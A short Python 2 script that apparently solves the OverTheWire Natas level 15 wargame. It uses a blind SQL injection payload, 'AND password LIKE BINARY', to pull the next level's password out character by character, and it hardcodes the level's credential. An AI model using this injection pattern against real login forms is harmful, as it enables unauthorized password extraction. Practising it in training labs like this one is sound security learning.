#!/usr/local/bin/python

import sys
import requests
import base64
import string
import time

#print "First argument is " + str(sys.argv[1])

url = 'http://natas15.natas.labs.overthewire.org/index.php'

prx = {
  'http': 'http://127.0.0.1:8080',
  'https': 'http://127.0.0.1:8080',
}


charseq = list(string.ascii_lowercase + string.ascii_uppercase + "0123456789")
req_data_fist = 'username=natas16%22%20AND%20password%20LIKE%20BINARY%20%27'
req_data_last = '%%27--%20'
pwd = ""

for i in range(1,10):
    for char in charseq:
        hdrs = {'Content-Type': 'application/x-www-form-urlencoded'}
        req_data = req_data_fist + pwd + char + req_data_last
        #req_data = "username=natas16"
        print req_data
        r = requests.post(url, headers=hdrs, data=req_data, auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), proxies=prx)
        #time.sleep(0.5)
        if "This user exists" in r.content:
            pwd+=char
            print "\nFound char " + char + "\n"
            break

#print resp.read()
